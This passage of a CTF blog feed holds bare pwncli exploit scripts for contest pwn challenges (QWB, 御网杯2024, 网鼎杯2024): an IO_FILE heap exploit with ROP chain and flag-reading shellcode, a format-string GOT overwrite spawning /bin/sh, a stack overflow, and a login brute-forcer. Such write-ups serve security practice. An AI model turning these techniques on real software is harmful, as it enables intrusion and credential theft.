class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io  = gift[<span class="hljs-string">&quot;io&quot;</span>] <span class="hljs-comment"># io对象，pwn.process或者pwn.remote</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    <span class="hljs-comment">#gift[&#x27;libc&#x27;] = libc</span><br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;Enter your choice: \n&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-comment"># 0x500 &lt; &lt; 0x5ff</span><br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;Enter your commodity size \n&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;Enter which to delete: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;Enter which to edit: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&quot;Input the content \n&quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;Enter which to show: \n&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Env</span>():<br>    cmd(<span class="hljs-number">5</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bc</span>(<span class="hljs-params">src,tar</span>):<br>    cmd(<span class="hljs-number">0</span>)<br>    sa(<span class="hljs-string">&quot;Input your target addr \n&quot;</span>,src)<br>    sl(tar)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    libc.address = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWN&quot;</span>)<br>    add(<span class="hljs-number">0x528</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x518</span>)<span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x518</span>)<span class="hljs-comment">#3</span><br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">0x538</span>)<span class="hljs-comment">#4</span><br>    free(<span class="hljs-number">3</span>)<br>    show(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&quot;The content is here \n&quot;</span>)<br>    libc.address = u64_ex(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x7fad50c1b110</span>+<span class="hljs-number">0x7fad50a00000</span><br>    io.recv(<span class="hljs-number">8</span>)<br>    heap_base = u64_ex(io.recv(<span class="hljs-number">8</span>))<br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br>    orw_Addr =  (heap_base-<span class="hljs-number">0x1000</span>)&amp;<span class="hljs-number">0xfffffffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;ret:&#x27;</span>+<span class="hljs-built_in">hex</span>(CG.ret()))<br>    pay = <span class="hljs-string">b&#x27;&#x27;</span><br>    io_ = IO_FILE_plus_struct()<br>    io_.vtable = libc.sym._IO_wfile_jumps-<span class="hljs-number">0xa8</span>-<span class="hljs-number">0x18</span><br>    io_._wide_data = heap_base+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x20</span><br>    io_._IO_write_base = <span class="hljs-number">0</span><br>    io_._IO_write_ptr = <span class="hljs-number">1</span><br>    pay+=<span class="hljs-built_in">bytes</span>(io_)[<span class="hljs-number">0x30</span>:]<br>    pay = pay.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x20</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x168</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(libc.sym.setcontext+<span class="hljs-number">61</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x1a0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x200</span>+<span class="hljs-number">0x20</span>)+p64_ex(CG.ret())<br>    pay = pay.ljust(<span class="hljs-number">0x1e0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x20</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64_ex(CG.pop_rdi_ret())+p64_ex(orw_Addr)+p64_ex(CG.pop_rsi_ret())+p64_ex(<span class="hljs-number">0x3000</span>)+p64_ex(CG.pop_rdx_rbx_ret())+p64_ex(<span class="hljs-number">7</span>)*<span class="hljs-number">2</span>+p64_ex(CG.pop_rax_ret())+p64_ex(<span class="hljs-number">10</span>)+p64_ex(CG.syscall_ret())<br>    pay += p64_ex(CG.pop_rdi_ret())+p64_ex(<span class="hljs-number">0</span>)+p64_ex(CG.pop_rsi_ret())+p64_ex(orw_Addr)+p64_ex(CG.pop_rdx_rbx_ret())+p64_ex(<span class="hljs-number">0x1000</span>)*<span class="hljs-number">2</span>+p64_ex(CG.pop_rax_ret())+p64_ex(<span class="hljs-number">0</span>)+p64_ex(CG.syscall_ret())<br>    pay += p64_ex(libc.address + <span class="hljs-number">0x000000000002b8ba</span>)<br><br><br>    p = p64_ex(libc.address+<span class="hljs-number">0x7fad50c1b110</span>-<span class="hljs-number">0x7fad50a00000</span>)*<span class="hljs-number">2</span>+p64_ex(heap_base)+p64_ex(libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x20</span>)+pay<br>    edit(<span class="hljs-number">1</span>,p)<br>    add(<span class="hljs-number">0x548</span>)<span class="hljs-comment">#5</span><br>    log.success(<span class="hljs-string">&#x27;_IO_wfile_jumps: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]))<br>    log.success(<span class="hljs-string">&#x27;_IO_wfile_overflow: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_overflow&#x27;</span>]))<br>    log.success(<span class="hljs-string">&#x27;break: b * &#x27;</span>+<span class="hljs-built_in">hex</span>(CG.syscall_ret()))<br>    pause()<br>    add(<span class="hljs-number">0x518</span>)<br>    cmd(<span class="hljs-number">3</span>)<br>    shell = <span class="hljs-string">b&#x27;H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6H\xc7\xc2\x00\x01\x00\x00H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x00\x01\x00\x00H\xc7\xc0\x01\x00\x00\x00\x0f\x05&#x27;</span><br>    sl(shell)<br>    <span class="hljs-comment"># b * _IO_flush_all_lockp</span><br><br><span class="hljs-comment">#log</span><br>    <br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>qwb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>御网杯2024</title>
    <link href="/2024/10/30/%E5%BE%A1%E7%BD%91%E6%9D%AF2024/"/>
    <url>/2024/10/30/%E5%BE%A1%E7%BD%91%E6%9D%AF2024/</url>
    
    <content type="html"><![CDATA[<h2 id="writehere"><a href="#writehere" class="headerlink" title="writehere"></a>writehere</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>time_ = (<span class="hljs-built_in">int</span>)(time())<br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>one_ = [<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    ru(<span class="hljs-string">&quot;Please enter your name&quot;</span>)<br>    p1 = <span class="hljs-string">b&#x27;%p&#x27;</span>*<span class="hljs-number">4</span><br>    s(p1)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    libc.address  = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">18</span>-libc.sym.read<br>    p1 = p1.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(<span class="hljs-number">0x40121b</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>    s(p1)<br>    ru(<span class="hljs-string">&quot;Congratulations on completing a big step&quot;</span>)<br>    p2 = p64_ex(<span class="hljs-number">0x404038</span>)<br>    s(p2)<br>    p3 = p64_ex(<span class="hljs-number">0x4010D0</span>)<br>    s(p3)<br>    <span class="hljs-comment">#0x403e18</span><br>    ru(<span class="hljs-string">&quot;Please enter your name&quot;</span>)<br>    p1 = <span class="hljs-string">b&#x27;%p&#x27;</span>*<span class="hljs-number">4</span><br>    s(p1)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    p1 = p1.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)+p64_ex(<span class="hljs-number">0x40121b</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>    s(p1)<br>    ru(<span class="hljs-string">&quot;Congratulations on completing a big step&quot;</span>)<br>    p2 = p64_ex(<span class="hljs-number">0x404020</span>)<br>    s(p2)<br>    p3 = p64_ex(libc.sym.system)<br>    s(p3)<br>    ru(<span class="hljs-string">&quot;Please enter your name&quot;</span>)<br>    sl(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#log</span><br>    <br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    <span class="hljs-comment">#log.success(&#x27;heap_bae:&#x27;+hex(heap_base))</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯2024 - 青龙</title>
    <link href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%20-%20%E9%9D%92%E9%BE%99/"/>
    <url>/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%20-%20%E9%9D%92%E9%BE%99/</url>
    
    <content type="html"><![CDATA[<h2 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br><br><br>arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWN&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Enter your username: &quot;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Enter your password: &quot;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;You will input this: &quot;</span>)<br>    ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>    stack_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>    p =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p32_ex(<span class="hljs-number">0x804A038</span>).ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p32_ex(stack_addr)+p32_ex(<span class="hljs-number">0x080485fa</span>)<br>    sla(<span class="hljs-string">&quot;plz input your msg:\n&quot;</span>,p)<br><br><br><br><span class="hljs-comment">#log</span><br>    <br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    <span class="hljs-comment">#log.success(&#x27;heap_bae:&#x27;+hex(heap_base))</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="PWN04"><a href="#PWN04" class="headerlink" title="PWN04"></a>PWN04</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x21</span>,<span class="hljs-number">0x7f</span>):<br>sla(<span class="hljs-string">&quot;Input your username:&quot;</span>,name+<span class="hljs-built_in">chr</span>(i))<br>io.recvline()<br>c = io.recvline()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;length!&#x27;</span> <span class="hljs-keyword">in</span> c:<br>name += <span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;correct!&#x27;</span> <span class="hljs-keyword">in</span> c:<br>name += <span class="hljs-built_in">chr</span>(i)<br>exit()<br><br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x21</span>,<span class="hljs-number">0x7f</span>):<br>sla(<span class="hljs-string">&quot;Input your username:&quot;</span>,<span class="hljs-string">&#x27;4dm1n&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Input your password:&quot;</span>,passwd+<span class="hljs-built_in">chr</span>(i))<br>io.recvline()<br>c = io.recvline()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;length!&#x27;</span> <span class="hljs-keyword">in</span> c:<br>passwd += <span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;correct!&#x27;</span> <span class="hljs-keyword">in</span> c:<br>passwd += <span class="hljs-built_in">chr</span>(i)<br>exit()<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 